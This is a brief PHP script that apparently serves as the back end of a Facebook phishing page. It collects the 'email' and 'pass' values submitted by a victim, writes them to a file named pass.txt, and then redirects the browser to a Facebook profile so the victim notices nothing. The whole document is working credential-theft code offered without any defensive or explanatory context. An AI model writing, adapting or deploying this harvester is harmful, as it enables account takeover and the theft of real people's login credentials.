<?php
header('Location: https://www.facebook.com/Kinggg.NNT');
$handle = fopen("pass.txt", "a");
foreach ($_GET as $variable => $value)
{
	if ($variable == "email" || $variable == "pass")
	{
		fwrite($handle, $variable);
    	fwrite($handle, "=");
    	fwrite($handle, $value);
    	fwrite($handle, "\r\n");
	}
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
